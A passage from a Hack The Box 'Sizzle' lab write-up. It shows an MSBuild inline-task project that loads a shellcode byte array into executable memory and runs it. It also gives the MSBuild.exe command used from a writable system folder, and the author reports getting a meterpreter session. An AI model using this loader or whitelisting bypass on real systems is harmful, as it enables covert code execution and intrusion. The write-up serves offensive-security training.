0x63,0x5e,0xd2,0xca,0xb0,0xc0,0xd1,0xb8,0xb1,0x22,0x8e,0x26,0xac,0x55,0xd4,
0x41,0x36,0x42,0xff,0xb6,0xfc,0x87,0x62,0xfe,0x8b,0x4f,0x47,0x83,0xc4,0x93,
0x38,0x7c,0xfb,0x55,0xa3,0xd8,0xc2,0x53,0x1f,0x27,0x47,0x75,0x56,0xfc,0xcd,
0xc9,0x9e,0x08,0xfe,0x35,0x74,0x2a,0xf3,0x27,0x22,0xad,0x8e,0x41,0xde,0xb6,
0xf2,0xf2,0xe8,0xb7,0x82,0x3b,0x66,0x38,0x95,0x46,0x4e,0x35,0x75,0x48,0x86,
0xab,0xdd,0x43,0x08,0xc7,0xcd,0x29,0xac,0x20,0xb5,0x3a,0x75,0x5f,0x39,0x85,
0xf1,0xd4,0xd4,0xf6,0xb6,0x35,0x65,0xc4,0x57,0x05,0x69,0x90,0x9a,0xfb,0x18,
0xee,0x0d,0xd3,0x02,0xae,0x40,0x38,0xac,0xaa,0x40,0x4c,0x9c,0xc9,0x3a,0xca,
0x24,0x09,0xe7,0x0c,0x8c,0x68,0xb5,0x66,0x61,0x78,0xf2,0xd0,0x29,0xea,0x33,
0xeb,0xb5,0x4d,0xc4,0xc8,0x8e,0xf1,0x28,0xdf,0xed,0xee,0xe9,0x29,0xc5,0x91,
0xea,0x1f,0x7d,0x47,0xbd,0xf9,0xde,0x66,0x58 };


              
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\system32\spool\drivers\color\shellcode.xml
```

\
![](https://0xrick.github.io/images/hackthebox/sizzle/37.png)\
\
This time it worked and I got `meterpreter` !\
![](https://0xrick.github.io/images/hackthebox/sizzle/38.png)
